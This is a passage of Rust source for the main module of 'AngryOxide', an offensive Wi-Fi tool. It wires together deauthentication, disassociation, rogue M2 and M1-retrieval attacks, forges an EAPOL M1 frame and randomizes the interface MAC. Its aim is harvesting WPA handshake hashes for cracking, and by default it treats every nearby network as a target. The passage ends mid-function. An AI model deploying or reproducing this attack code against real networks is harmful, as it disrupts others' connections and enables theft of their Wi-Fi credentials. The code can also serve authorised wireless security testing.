#![allow(dead_code)]
mod advancedtable;
mod ascii;
mod attack;
mod auth;
mod database;
mod devices;
mod eventhandler;
mod geofence;
mod gps;
mod matrix;
mod oui;
mod pcapng;
mod rawsocks;
mod snowstorm;
mod status;
mod tabbedblock;
mod targets;
mod tx;
mod ui;
mod util;
mod whitelist;

extern crate libc;
extern crate nix;

use anyhow::Result;
use attack::{
    anon_reassociation_attack, deauth_attack, disassoc_attack, m1_retrieval_attack,
    m1_retrieval_attack_phase_2, rogue_m2_attack_directed, rogue_m2_attack_undirected,
};

use chrono::Local;
use crossterm::event::{
    DisableMouseCapture, EnableMouseCapture, Event, KeyCode, KeyEventKind, KeyModifiers,
    MouseEventKind,
};
use crossterm::terminal::{
    disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen,
};
use database::DatabaseWriter;
use geoconvert::LatLon;
use geofence::Geofence;
use gps::GPSDSource;
use libc::EXIT_FAILURE;
use libwifi::frame::components::{MacAddress, RsnAkmSuite, RsnCipherSuite, WpaAkmSuite};
use libwifi::frame::{DataFrame, EapolKey, NullDataFrame};
use nix::unistd::geteuid;

use nl80211_ng::attr::Nl80211Iftype;
use nl80211_ng::channels::{freq_to_band, map_str_to_band_and_channel, WiFiBand};
use nl80211_ng::{get_interface_info_idx, set_interface_chan, Interface, Nl80211};

use flate2::write::GzEncoder;
use flate2::Compression;

use oui::OuiDatabase;
use pcapng::{FrameData, PcapWriter};
use radiotap::field::{AntennaSignal, Field};
use radiotap::Radiotap;
use rand::{thread_rng, Rng};
use ratatui::backend::CrosstermBackend;
use ratatui::layout::Rect;
use ratatui::widgets::TableState;
use ratatui::Terminal;
use rawsocks::{open_socket_rx, open_socket_tx};
use tar::Builder;
use targets::{Target, TargetList, TargetMAC, TargetSSID};
use tx::{
    build_association_response, build_authentication_response, build_disassocation_from_client,
    build_eapol_m1, build_probe_request_target, build_probe_request_undirected,
};
use ui::UiState;
use uuid::Uuid;
use whitelist::WhiteList;

use crate::ascii::get_art;
use crate::auth::HandshakeStorage;
use crate::devices::{APFlags, AccessPoint, Station, WiFiDeviceList};
use crate::eventhandler::{EventHandler, EventType};
use crate::matrix::MatrixSnowstorm;
use crate::snowstorm::Snowstorm;
use crate::status::*;
use crate::ui::{print_ui, MenuType};
use crate::util::{parse_ip_address_port, sanitize_essid};
use crate::whitelist::{White, WhiteMAC, WhiteSSID};

use libwifi::{Addresses, Frame};

use crossterm::{cursor::Hide, cursor::Show, execute};

use std::collections::{BTreeMap, HashMap};
use std::fmt::Debug;
use std::fs::{remove_file, File, OpenOptions};
use std::io::stdout;
use std::io::Write;
use std::io::{self, BufRead, BufReader};
use std::os::fd::{AsRawFd, OwnedFd};
use std::path::Path;
use std::process::exit;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime};
use std::{fmt, thread};

use clap::{ArgAction, Parser};

#[derive(Parser)]
#[command(name = "AngryOxide")]
#[command(author = "Ryan Butler (rage)")]
#[command(about = "Does awesome things... with wifi.", long_about = None)]
#[command(version)]
struct Arguments {
    /// Interface to use.
    #[arg(short, long)]
    interface: String,

    /// Optional - Channel to scan. Will use "-c 1,6,11" if none specified.
    #[arg(short, long, use_value_delimiter = true, action = ArgAction::Append)]
    channel: Vec<String>,

    /// Optional - Entire band to scan - will include all channels interface can support.
    #[arg(short, long, name = "2 | 5 | 6 | 60", use_value_delimiter = true, action = ArgAction::Append)]
    band: Vec<u8>,

    /// Optional - Target (MAC or SSID) to attack - will attack everything if none specified.
    #[arg(short, long, help_heading = "Targeting", name = "Target MAC/SSID", action = ArgAction::Append)]
    target_entry: Option<Vec<String>>,

    /// Optional - Whitelist (MAC or SSID) to NOT attack.
    #[arg(short, long, help_heading = "Targeting", name = "WhiteList MAC/SSID", action = ArgAction::Append)]
    whitelist_entry: Option<Vec<String>>,

    /// Optional - File to load target entries from.
    #[arg(long, help_heading = "Targeting", name = "Targets File")]
    targetlist: Option<String>,

    /// Optional - File to load whitelist entries from.
    #[arg(long, help_heading = "Targeting", name = "Whitelist File")]
    whitelist: Option<String>,

    /// Optional - Attack rate (1, 2, 3 || 3 is most aggressive)
    #[arg(short, long, default_value_t = 2, value_parser = clap::value_parser!(u8).range(1..=3), help_heading = "Advanced Options", name = "Attack Rate")]
    rate: u8,

    /// Optional - Output filename.
    #[arg(short, long, name = "Output Filename")]
    output: Option<String>,

    /// Optional - Combine all hc22000 files into one large file for bulk processing.
    #[arg(long, help_heading = "Advanced Options")]
    combine: bool,

    /// Optional - Disable Active Monitor mode.
    #[arg(long, help_heading = "Advanced Options")]
    noactive: bool,

    /// Optional - Tx MAC for rogue-based attacks - will randomize if excluded.
    #[arg(long, help_heading = "Advanced Options", name = "MAC Address")]
    rogue: Option<String>,

    /// Optional - Alter default HOST:Port for GPSD connection.
    #[arg(
        long,
        default_value = "127.0.0.1:2947",
        help_heading = "Advanced Options",
        name = "GPSD Host:Port"
    )]
    gpsd: String,

    /// Optional - AO will auto-hunt all channels then lock in on the ones targets are on.
    #[arg(long, help_heading = "Advanced Options")]
    autohunt: bool,

    /// Optional - Set the tool to headless mode without a UI. (useful with --autoexit)
    #[arg(long, help_heading = "Advanced Options")]
    headless: bool,

    /// Optional - AO will auto-exit when all targets have a valid hashline.
    #[arg(long, help_heading = "Advanced Options")]
    autoexit: bool,

    /// Optional - Do not transmit - passive only.
    #[arg(long, help_heading = "Advanced Options")]
    notransmit: bool,

    /// Optional - Do NOT send deauths (will try other attacks only).
    #[arg(long, help_heading = "Advanced Options")]
    nodeauth: bool,

    /// Optional - Do not tar output files.
    #[arg(long, help_heading = "Advanced Options")]
    notar: bool,

    /// Optional - Disable mouse capture (scroll wheel).
    #[arg(long, help_heading = "Advanced Options")]
    disablemouse: bool,

    /// Optional - Adjust channel hop dwell time.
    #[arg(
        long,
        default_value_t = 2,
        help_heading = "Advanced Options",
        name = "Dwell Time (seconds)"
    )]
    dwell: u64,

    /// Optional - Enable geofencing using a specified grid and distance.
    #[arg(
        long,
        help_heading = "Geofencing",
        requires = "center",
        requires = "distance"
    )]
    geofence: bool,

    /// MGRS grid for geofencing (required if geofence is enabled).
    #[arg(long, help_heading = "Geofencing", requires = "geofence")]
    center: Option<String>,

    /// Distance in meters from the grid centerpoint (required if geofence is enabled).
    #[arg(long, help_heading = "Geofencing", requires = "geofence")]
    distance: Option<f64>,

    /// Timeout to disable geofence if GPS is lost. (default 300 seconds)
    #[arg(
        long,
        help_heading = "Geofencing",
        requires = "geofence",
        default_value_t = 300
    )]
    geofence_timeout: u32,
}

#[derive(Default)]
pub struct Counters {
    pub frame_count: u64,
    pub eapol_count: u64,
    pub error_count: u64,
    pub packet_id: u64,
    pub empty_reads: u64,
    pub empty_reads_rate: u64,
    pub seq1: u16,
    pub seq2: u16,
    pub seq3: u16,
    pub seq4: u16,
    pub prespidx: u8,
    pub beacons: usize,
    pub data: usize,
    pub null_data: usize,
    pub probe_requests: usize,
    pub probe_responses: usize,
    pub control_frames: usize,
    pub authentication: usize,
    pub deauthentication: usize,
    pub association: usize,
    pub reassociation: usize,
}

impl Counters {
    pub fn packet_id(&mut self) -> u64 {
        self.packet_id += 1;
        self.packet_id
    }

    pub fn sequence1(&mut self) -> u16 {
        self.seq1 = if self.seq1 >= 4096 { 1 } else { self.seq1 + 1 };
        self.seq1
    }

    pub fn sequence2(&mut self) -> u16 {
        self.seq2 = if self.seq2 >= 4096 { 1 } else { self.seq2 + 1 };
        self.seq2
    }

    pub fn sequence3(&mut self) -> u16 {
        self.seq3 = if self.seq3 >= 4096 { 1 } else { self.seq3 + 1 };
        self.seq3
    }

    pub fn sequence4(&mut self) -> u16 {
        self.seq4 = if self.seq4 >= 4096 { 1 } else { self.seq4 + 1 };
        self.seq4
    }

    pub fn proberesponseindex(&mut self) -> u8 {
        self.prespidx = if self.prespidx >= 10 {
            0
        } else {
            self.prespidx + 1
        };
        self.prespidx
    }
}

#[derive(Debug)]
pub enum AttackRate {
    Slow,
    Normal,
    Fast,
}

impl fmt::Display for AttackRate {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(
            f,
            "{}",
            match self {
                AttackRate::Slow => "Slow",
                AttackRate::Normal => "Normal",
                AttackRate::Fast => "Fast",
            }
        )
    }
}

impl AttackRate {
    pub fn to_rate(&self) -> u32 {
        match self {
            AttackRate::Slow => 200,
            AttackRate::Normal => 100,
            AttackRate::Fast => 40,
        }
    }

    pub fn from_u8(rate: u8) -> Self {
        match rate {
            1 => AttackRate::Slow,
            2 => AttackRate::Normal,
            3 => AttackRate::Fast,
            _ => AttackRate::Normal,
        }
    }
}

pub struct RawSockets {
    rx_socket: OwnedFd,
    tx_socket: OwnedFd,
}

pub struct Config {
    notx: bool,
    deauth: bool,
    autoexit: bool,
    headless: bool,
    notar: bool,
    autohunt: bool,
    combine: bool,
    disable_mouse: bool,
}

pub struct IfHardware {
    netlink: Nl80211,
    original_address: MacAddress,
    current_band: WiFiBand,
    current_channel: u32,
    hop_channels: Vec<(u8, u32)>,
    target_chans: HashMap<Target, Vec<(u8, u32)>>,
    locked: bool,
    hop_interval: Duration,
    interface: Interface,
    interface_uuid: Uuid,
}

pub struct TargetData {
    whitelist: WhiteList,
    targets: TargetList,
    attack_rate: AttackRate,
    rogue_client: MacAddress,
    rogue_m1: EapolKey,
    rogue_essids: HashMap<MacAddress, String>,
}

pub struct FileData {
    oui_database: OuiDatabase,
    file_prefix: String,
    start_time: String,
    current_pcap: PcapWriter,
    db_writer: DatabaseWriter,
    output_files: Vec<String>,
    gps_source: GPSDSource,
    hashlines: HashMap<String, (usize, usize)>,
}

pub struct OxideRuntime {
    ui_state: UiState,
    counters: Counters,
    access_points: WiFiDeviceList<AccessPoint>,
    unassoc_clients: WiFiDeviceList<Station>,
    handshake_storage: HandshakeStorage,
    status_log: status::MessageLog,
    eventhandler: EventHandler,
    raw_sockets: RawSockets,
    file_data: FileData,
    target_data: TargetData,
    if_hardware: IfHardware,
    config: Config,
}

impl OxideRuntime {
    fn new(cli_args: &Arguments) -> Self {
        println!("Starting AngryOxide... 😈");

        let rogue = cli_args.rogue.clone();
        let interface_name = cli_args.interface.clone();
        let targets = cli_args.target_entry.clone();
        let wh_list = cli_args.whitelist_entry.clone();
        let targetsfile = cli_args.targetlist.clone();
        let wh_listfile = cli_args.whitelist.clone();
        let dwell = cli_args.dwell;
        let mut notransmit = cli_args.notransmit;

        // Setup initial lists / logs
        let access_points = WiFiDeviceList::new();
        let unassoc_clients = WiFiDeviceList::new();
        let handshake_storage = HandshakeStorage::new();
        let log = status::MessageLog::new(cli_args.headless, Some(500));

        // Get + Setup Interface

        let mut netlink = Nl80211::new().expect("Cannot open Nl80211");

        // Need to ensure the channels available here are validated
        let iface = if let Some(interface) = netlink
            .get_interfaces()
            .iter()
            .find(|&(_, iface)| iface.name_as_string() == interface_name)
            .map(|(_, iface)| iface.clone())
        {
            interface
        } else {
            println!("{}", get_art("Interface not found"));
            exit(EXIT_FAILURE);
        };

        let original_address = MacAddress::from_vec(iface.clone().mac.unwrap()).unwrap();

        let idx = iface.index.unwrap();
        let interface_uuid = Uuid::new_v4();
        println!("💲 Interface Summary:");
        println!("{}", iface.pretty_print());

        // Setup targets
        let mut target_vec: Vec<Target> = if let Some(vec_targets) = targets {
            vec_targets
                .into_iter()
                .map(|f| match MacAddress::from_str(&f) {
                    Ok(mac) => Target::MAC(TargetMAC::new(mac)),
                    Err(_) => Target::SSID(TargetSSID::new(&f)),
                })
                .collect()
        } else {
            vec![]
        };

        if let Some(file) = targetsfile {
            match File::open(file) {
                Ok(f) => {
                    let reader = BufReader::new(f);

                    for line in reader.lines() {
                        if line.as_ref().is_ok_and(|f| f.is_empty()) {
                            continue;
                        }
                        let target = match line {
                            Ok(l) => {
                                // Remove comments
                                let line = if let Some(index) = l.find('#') {
                                    let line_without_comment = &l[..index];
                                    line_without_comment
                                } else {
                                    &l
                                };
                                let _ = line.trim_end();
                                match MacAddress::from_str(&line) {
                                    Ok(mac) => Target::MAC(TargetMAC::new(mac)),
                                    Err(_) => Target::SSID(TargetSSID::new(&line)),
                                }
                            }
                            Err(_) => {
                                continue;
                            }
                        };
                        target_vec.push(target);
                    }
                }
                Err(e) => {
                    println!("❌ Error opening target file: {}", e);
                    println!("❌ Exiting...");
                    exit(EXIT_FAILURE);
                }
            }
        }

        if !target_vec.is_empty() {
            println!();
            println!("========= Target List =========");
            for (index, target) in target_vec.iter().enumerate() {
                let tree = if index == target_vec.len() - 1 {
                    "└"
                } else {
                    "├"
                };
                match target {
                    Target::MAC(tgt) => {
                        println!(" {} MAC: {}", tree, tgt.addr)
                    }
                    Target::SSID(tgt) => {
                        println!(" {} SSID: {}", tree, tgt.ssid)
                    }
                }
            }
            println!("========== Total: {:<2} ==========", target_vec.len());
            println!();
            if cli_args.autoexit {
                println!(
                    "💲 --autoexit set - will shutdown when hashline collected for ALL targets."
                );
            }
        } else {
            println!("💲 No target list provided... everything is a target 😏");
        }

        let targ_list = TargetList::from_vec(target_vec.clone());

        // Setup Whitelist
        let mut whitelist_vec: Vec<White> = if let Some(vec_whitelist) = wh_list {
            vec_whitelist
                .into_iter()
                .filter_map(|f| match MacAddress::from_str(&f) {
                    Ok(mac) => {
                        if targ_list.is_actual_target_mac(&mac) {
                            println!("❌ Whitelist {} is a target. Cannot add to whitelist.", mac);
                            None
                        } else {
                            Some(White::MAC(WhiteMAC::new(mac)))
                        }
                    }
                    Err(_) => {
                        if targ_list.is_actual_target_ssid(&f) {
                            println!("❌ Whitelist {} is a target. Cannot add to whitelist.", f);
                            None
                        } else {
                            Some(White::SSID(WhiteSSID::new(&f)))
                        }
                    }
                })
                .collect()
        } else {
            vec![]
        };

        if let Some(file) = wh_listfile {
            match File::open(file) {
                Ok(f) => {
                    let reader = BufReader::new(f);

                    for line in reader.lines() {
                        if line.as_ref().is_ok_and(|f| f.is_empty()) {
                            continue;
                        }

                        let white = match line {
                            Ok(l) => {
                                // Remove comments
                                let line = if let Some(index) = l.find('#') {
                                    let line_without_comment = &l[..index];
                                    line_without_comment
                                } else {
                                    &l
                                };
                                let _ = line.trim_end();
                                match MacAddress::from_str(&line) {
                                    Ok(mac) => {
                                        if targ_list.is_actual_target_mac(&mac) {
                                            println!("❌ Whitelist {} is a target. Cannot add to whitelist.", mac);
                                            continue;
                                        } else {
                                            White::MAC(WhiteMAC::new(mac))
                                        }
                                    }
                                    Err(_) => {
                                        if targ_list.is_actual_target_ssid(&line) {
                                            println!("❌ Whitelist {} is a target. Cannot add to whitelist.", line);
                                            continue;
                                        } else {
                                            White::SSID(WhiteSSID::new(&l))
                                        }
                                    }
                                }
                            }
                            Err(_) => {
                                continue;
                            }
                        };
                        whitelist_vec.push(white);
                    }
                }
                Err(e) => {
                    println!("❌ Error opening whitelist file: {}", e);
                    println!("❌ Exiting...");
                    exit(EXIT_FAILURE);
                }
            }
        }

        if !whitelist_vec.is_empty() {
            println!();
            println!("========= White List =========");
            for (index, device) in whitelist_vec.iter().enumerate() {
                let tree = if index == whitelist_vec.len() - 1 {
                    "└"
                } else {
                    "├"
                };
                match device {
                    White::MAC(dev) => {
                        println!(" {} MAC: {}", tree, dev.addr)
                    }
                    White::SSID(dev) => {
                        println!(" {} SSID: {}", tree, dev.ssid)
                    }
                }
            }
            println!("========== Total: {:<2} ==========", whitelist_vec.len());
            println!();
        } else {
            println!("💲 No whitelist list provided.");
        }

        let white_list = WhiteList::from_vec(whitelist_vec.clone());

        /////////////////////////////////////////////////////////////////////

        //// Setup Channels ////

        let mut iface_bands: BTreeMap<u8, Vec<u32>> = iface
            .get_frequency_list_simple()
            .unwrap()
            .into_iter()
            .collect();
        for (_key, value) in iface_bands.iter_mut() {
            value.sort(); // This sorts each vector in place
        }

        let mut hop_channels: Vec<(u8, u32)> = Vec::new();
        let mut hop_interval: Duration = Duration::from_secs(dwell);
        let mut target_chans: HashMap<Target, Vec<(u8, u32)>> = HashMap::new();
        let mut can_autohunt = cli_args.autohunt;

        if can_autohunt && targ_list.empty() {
            can_autohunt = false;
            println!("❌ --autohunt enabled but no targets given... ignoring.")
        }

        if can_autohunt && (!cli_args.band.is_empty() || !cli_args.channel.is_empty()) {
            println!("❌ --autohunt and channels/bands given. Ignoring supplied channels/bands.")
        }

        if can_autohunt {
            println!("🏹 Auto Hunting enabled - will attempt to locate target channels.");

            // Because we are autohunting - let's just add every available channel
            for (band, channels) in iface_bands {
                for channel in channels {
                    hop_channels.push((band, channel));
                }
            }

            // Set our hop interval much faster while hunting
            hop_interval = Duration::from_millis(100);
            // Set notx to true
            notransmit = true;

            // Setup our initial** target_chans
            for target in target_vec {
                target_chans.insert(target, vec![]);
            }
        } else {
            let mut channels = cli_args.channel.clone();
            let bands = cli_args.band.clone();
            let mut default_chans = false;

            if bands.is_empty() && channels.is_empty() {
                channels.extend(vec![
                    String::from("1"),
                    String::from("6"),
                    String::from("11"),
                ]);
                default_chans = true;
            }

            // Add all channels from bands
            for band in &bands {
                let band_chans = if let Some(chans) = iface_bands.get(band) {
                    chans.clone()
                } else {
                    println!(
                        "WARNING: Band {} not available for interface {}... ignoring",
                        band,
                        iface.name_as_string()
                    );
                    vec![]
                };
                for chan in band_chans {
                    hop_channels.push((*band, chan));
                }
            }

            // Add all individual channels (if valid)

            for channel in &channels {
                if let Some((band, channel)) = map_str_to_band_and_channel(channel) {
                    let band_u8 = band.to_u8();
                    if !hop_channels.contains(&(band_u8, channel)) {
                        if iface_bands.get(&band_u8).unwrap().contains(&channel) {
                            hop_channels.push((band_u8, channel));
                        } else {
                            println!(
                                "WARNING: Channel {} not available for interface {}... ignoring.",
                                channel,
                                iface.name_as_string()
                            );
                        }
                    }
                }
            }

            // Exit if we tried to provide channels but nothing made it to the hopper.
            if !default_chans && hop_channels.is_empty() {
                println!(
                    "{}",
                    get_art(&format!(
                        "No channels provided are supported by {}",
                        iface.name_as_string()
                    ))
                );
                exit(EXIT_FAILURE);
            }

            // Organize channels by band
            let mut channels_by_band: HashMap<u8, Vec<u32>> = HashMap::new();
            for (band, channel) in hop_channels.clone() {
                channels_by_band.entry(band).or_default().push(channel);
            }

            // Sort channels within each band
            for channels in channels_by_band.values_mut() {
                channels.sort();
            }

            // Print channels by band
            println!();
            println!("======== Hop Channels ========");
            for (index, (band, channels)) in channels_by_band.iter().enumerate() {
                let band_tree = if index == channels_by_band.len() - 1 {
                    "└"
                } else {
                    "├"
                };
                println!(" {} Band {} Channels:", band_tree, band,);
                for (idx, channel) in channels.iter().enumerate() {
                    let chan_b_tree = if index == channels_by_band.len() - 1 {
                        " "
                    } else {
                        "│"
                    };
                    let chan_tree = if idx == channels.len() - 1 {
                        "└"
                    } else {
                        "├"
                    };
                    println!(" {} {} {}", chan_b_tree, chan_tree, channel)
                }
            }
            println!("==============================");
            println!();
        }

        // Print Dwell Time
        println!("💲 Dwell Time: {}", cli_args.dwell);

        // Print attack Rate

        if notransmit && !can_autohunt {
            println!(
                "💲 Attack Rate: {} ({}) [NO TRANSMIT ENABLED]",
                AttackRate::from_u8(cli_args.rate),
                cli_args.rate
            );
        } else {
            println!(
                "💲 Attack Rate: {} ({})",
                AttackRate::from_u8(cli_args.rate),
                cli_args.rate
            );
        }

        ///////////////////////////////

        if let Some(ref phy) = iface.phy {
            if !phy.iftypes.clone().is_some_and(|types| {
                types.contains(&nl80211_ng::attr::Nl80211Iftype::IftypeMonitor)
            }) {
                println!(
                    "{}",
                    get_art("Monitor Mode not available for this interface.")
                );
                exit(EXIT_FAILURE);
            }
        }

        println!("💲 Mouse Capture: {}", !cli_args.disablemouse);

        // Put interface into the right mode
        thread::sleep(Duration::from_secs(1));
        println!("💲 Setting {} down.", interface_name);
        netlink.set_interface_down(idx).ok();
        thread::sleep(Duration::from_millis(500));

        // Setup Rogue Mac's
        let mut rogue_client = MacAddress::random();

        if let Some(rogue) = rogue {
            if let Ok(mac) = MacAddress::from_str(&rogue) {
                println!("💲 Setting {} mac to {} (from rogue)", interface_name, mac);
                rogue_client = mac;
            } else {
                println!(
                    "Invalid rogue supplied - randomizing {} mac to {}",
                    interface_name, rogue_client
                );
            }
        } else {
            println!("💲 Randomizing {} mac to {}", interface_name, rogue_client);
        }
        netlink.set_interface_mac(idx, &rogue_client.0).ok();

        thread::sleep(Duration::from_millis(500));

        // Setting Monitor
        println!(
            "💲 Setting {} to Monitor mode. (\"active\" flag: {})",
            interface_name,
            (iface.phy.clone().unwrap().active_monitor.is_some_and(|x| x) && !cli_args.noactive)
        );

        if iface.phy.clone().unwrap().active_monitor.is_some_and(|x| x) && !cli_args.noactive {
            netlink.set_interface_monitor(true, idx).ok();
        } else {
            netlink.set_interface_monitor(false, idx).ok();
        }

        if let Ok(after) = get_interface_info_idx(idx) {
            if let Some(iftype) = after.current_iftype {
                if iftype != Nl80211Iftype::IftypeMonitor {
                    println!("{}", get_art("Interface did not go into Monitor mode"));
                    exit(EXIT_FAILURE);
                }
            }
        } else {
            println!("{}", get_art("Couldn't re-retrieve interface info."));
            exit(EXIT_FAILURE);
        }

        // Set interface up
        thread::sleep(Duration::from_millis(500));
        println!("💲 Setting {} up.", interface_name);
        netlink.set_interface_up(idx).ok();
        netlink.set_powersave_off(idx).ok();

        if let Err(e) = set_interface_chan(idx, hop_channels[0].1, hop_channels[0].0) {
            eprintln!("{}", e);
        }

        // Setup OUI Database
        let oui_db = OuiDatabase::new();
        println!("💲 OUI Records Imported: {}", oui_db.record_count());

        // Open sockets
        let rx_socket = open_socket_rx(idx.try_into().unwrap()).expect("Failed to open RX Socket.");
        let tx_socket = open_socket_tx(idx.try_into().unwrap()).expect("Failed to open TX Socket.");
        thread::sleep(Duration::from_millis(500));

        println!(
            "💲 Sockets Opened [Rx: {} | Tx: {}]",
            rx_socket.as_raw_fd(),
            tx_socket.as_raw_fd()
        );

        // Setup RogueM1 Data
        let mut rng = thread_rng();
        let key_nonce: [u8; 32] = rng.gen();

        let rogue_m1 = EapolKey {
            protocol_version: 2u8,
            timestamp: SystemTime::now(),
            packet_type: 3u8,
            packet_length: 0u16,
            descriptor_type: 2u8,
            key_information: 138u16,
            key_length: 16u16,
            replay_counter: 1u64,
            key_nonce,
            key_iv: [0u8; 16],
            key_rsc: 0u64,
            key_id: 0u64,
            key_mic: [0u8; 16],
            key_data_length: 0u16,
            key_data: Vec::new(),
        };

        // Decide whether to use matrix or snowfall for UI state
        // 50/50 change of getting snowflakes or the matrix
        let use_snowstorm = rand::thread_rng().gen_bool(0.5);

        let state = UiState {
            current_menu: MenuType::AccessPoints,
            paused: false,
            show_quit: false,
            copy_short: false,
            copy_long: false,
            add_target: false,
            set_autoexit: false,
            show_keybinds: false,
            ui_snowstorm: use_snowstorm,
            ap_sort: 0,
            ap_state: TableState::new(),
            ap_table_data: access_points.clone(),
            ap_sort_reverse: false,
            ap_selected_item: None,
            sta_sort: 0,
            sta_state: TableState::new(),
            sta_table_data: unassoc_clients.clone(),
            sta_sort_reverse: false,
            sta_selected_item: None,
            hs_sort: 0,
            hs_state: TableState::new(),
            hs_table_data: handshake_storage.clone(),
            hs_sort_reverse: false,
            hs_selected_item: None,
            messages_sort: 0,
            messages_state: TableState::new(),
            messages_table_data: log.get_all_messages(),
            messages_sort_reverse: false,
            snowstorm: Snowstorm::new_rainbow(Rect::new(1, 2, 3, 4)),
            matrix_snowstorm: MatrixSnowstorm::new(Rect::new(1, 2, 3, 4)),
        };

        // Setup Filename Prefix
        let file_prefix = if let Some(fname) = cli_args.output.clone() {
            fname.to_string()
        } else {
            "oxide".to_string()
        };

        let now: chrono::prelude::DateTime<Local> = Local::now();
        let date_time = now.format("-%Y-%m-%d_%H-%M-%S").to_string();
        let pcap_filename = format!("{}{}.pcapng", file_prefix, date_time);
        let mut pcap_file = PcapWriter::new(&iface, &pcap_filename);
        pcap_file.start();

        // Setup KismetDB Writing
        let kismetdb_filename = format!("{}.kismet", file_prefix);
        let mut database = DatabaseWriter::new(
            &kismetdb_filename,
            interface_uuid.hyphenated().to_string(),
            iface.clone(),
        );
        database.start();

        // Setup GPSD
        let (host, port) = if let Ok((host, port)) = parse_ip_address_port(&cli_args.gpsd) {
            (host, port)
        } else {
            println!("GPSD argument {} not valid... ignoring.", cli_args.gpsd);
            parse_ip_address_port("127.0.0.1:2974").unwrap()
        };

        // TODO: Allow plugins to overwrite this with a new GPS_Source?
        let mut gps_source = GPSDSource::new(host, port);
        gps_source.start();

        let file_data: FileData = FileData {
            oui_database: oui_db,
            file_prefix,
            start_time: date_time,
            current_pcap: pcap_file,
            db_writer: database,
            output_files: vec![pcap_filename, kismetdb_filename],
            gps_source,
            hashlines: HashMap::new(),
        };

        // Setup Rogue_ESSID's tracker
        let rogue_essids: HashMap<MacAddress, String> = HashMap::new();

        let mut eventhandler = EventHandler::new();
        if !cli_args.headless {
            eventhandler.start();
        }

        println!();
        println!("🎩 KICKING UP THE 4D3D3D3 🎩");
        println!();
        println!("======================================================================");
        println!();
        thread::sleep(Duration::from_secs(2));

        let raw_sockets = RawSockets {
            rx_socket,
            tx_socket,
        };

        let config = Config {
            notx: notransmit,
            deauth: !cli_args.nodeauth,
            autoexit: cli_args.autoexit,
            headless: cli_args.headless,
            notar: cli_args.notar,
            autohunt: can_autohunt,
            combine: cli_args.combine,
            disable_mouse: cli_args.disablemouse,
        };

        let if_hardware = IfHardware {
            netlink,
            original_address,
            current_band: WiFiBand::Unknown,
            current_channel: 0,
            hop_channels,
            hop_interval,
            target_chans,
            locked: false,
            interface: iface,
            interface_uuid,
        };

        let target_data: TargetData = TargetData {
            whitelist: white_list,
            targets: targ_list,
            rogue_client,
            rogue_m1,
            rogue_essids,
            attack_rate: AttackRate::from_u8(cli_args.rate),
        };

        OxideRuntime {
            raw_sockets,
            config,
            handshake_storage,
            access_points,
            unassoc_clients,
            ui_state: state,
            if_hardware,
            target_data,
            file_data,
            counters: Counters::default(),
            status_log: log,
            eventhandler,
        }
    }

    fn get_current_menu_len(&self) -> usize {
        match self.ui_state.current_menu {
            MenuType::AccessPoints => self.access_points.size(),
            MenuType::Clients => self.unassoc_clients.size(),
            MenuType::Handshakes => self.handshake_storage.count(),
            MenuType::Messages => self.status_log.size(),
        }
    }

    pub fn get_adjacent_channel(&self) -> Option<u32> {
        let band_channels = self
            .if_hardware
            .interface
            .get_frequency_list_simple()
            .unwrap();
        let current_channel = self.if_hardware.current_channel;
        let mut band: u8 = 0;

        // Get our band
        for (hashband, channels) in band_channels.clone() {
            if channels.contains(&current_channel) {
                band = hashband;
            }
        }

        if band == 0 {
            return None;
        }

        // Get the adjacent channel
        if let Some(channels) = band_channels.get(&band) {
            let mut closest_distance = u32::MAX;
            let mut closest_channel = None;

            for &channel in channels {
                let distance = if channel > current_channel {
                    channel - current_channel
                } else {
                    current_channel - channel
                };

                if distance < closest_distance && distance != 0 {
                    closest_distance = distance;
                    closest_channel = Some(channel);
                }
            }

            closest_channel
        } else {
            None
        }
    }

    fn get_target_success(&mut self) -> bool {
        // If there are no targets always return false (not complete)
        if self.target_data.targets.empty() {
            return false;
        }

        let mut all_completes: Vec<bool> = Vec::new();

        for target in self.target_data.targets.get_ref() {
            match target {
                Target::MAC(tgt) => {
                    if self
                        .handshake_storage
                        .has_complete_handshake_for_ap(&tgt.addr)
                    {
                        all_completes.push(true);
                    } else {
                        all_completes.push(false);
                    }
                }
                Target::SSID(tgt) => {
                    if let Some(ap) = self.access_points.get_device_by_ssid(&tgt.ssid) {
                        if self
                            .handshake_storage
                            .has_complete_handshake_for_ap(&ap.mac_address)
                        {
                            all_completes.push(true);
                        } else {
                            all_completes.push(false);
                        }
                    } else {
                        all_completes.push(false);
                    }
                }
            }
        }
        !all_completes.contains(&false)
    }
}

fn process_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
    let radiotap = match Radiotap::from_bytes(packet) {
        Ok(radiotap) => radiotap,
        Err(error) => {
            oxide.counters.error_count += 1;
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Error,
                format!("Couldn't read packet data with Radiotap: {error:?}",),
            ));
            return Err(error.to_string());
        }
    };

    oxide.counters.frame_count += 1;
    let packet_id = oxide.counters.packet_id();

    // Get Channel Values
    let current_freq = oxide.if_hardware.interface.frequency.clone();

    if current_freq.channel.is_none() {
        panic!("Channel is None. Current Frequency: {current_freq:?}");
    }

    let current_channel = current_freq.channel.unwrap();
    oxide.if_hardware.current_channel = current_channel.clone();
    oxide.if_hardware.current_band = freq_to_band(current_freq.frequency.unwrap());

    let band = &oxide.if_hardware.current_band;
    let payload = &packet[radiotap.header.length..];

    let fcs = radiotap.flags.map_or(false, |flags| flags.fcs);
    let gps_data = oxide.file_data.gps_source.get_gps();
    let source: MacAddress;
    let destination: MacAddress;

    // Send a probe request out there every 200 beacons.
    if oxide.counters.beacons % 200 == 0 && !oxide.config.notx {
        let frx = build_probe_request_undirected(
            &oxide.target_data.rogue_client,
            oxide.counters.sequence2(),
        );
        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
    }

    match libwifi::parse_frame(payload, fcs) {
        Ok(frame) => {
            source = *frame.src().unwrap_or(&MacAddress([0, 0, 0, 0, 0, 0]));
            destination = *frame.dest();
            let mut beacon_count = 999;

            // Pre Processing
            match frame.clone() {
                Frame::Beacon(beacon_frame) => {
                    oxide.counters.beacons += 1;
                    let bssid = beacon_frame.header.address_3;
                    let signal_strength: AntennaSignal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    let station_info = &beacon_frame.station_info;
                    let ssid = station_info
                        .ssid
                        .as_ref()
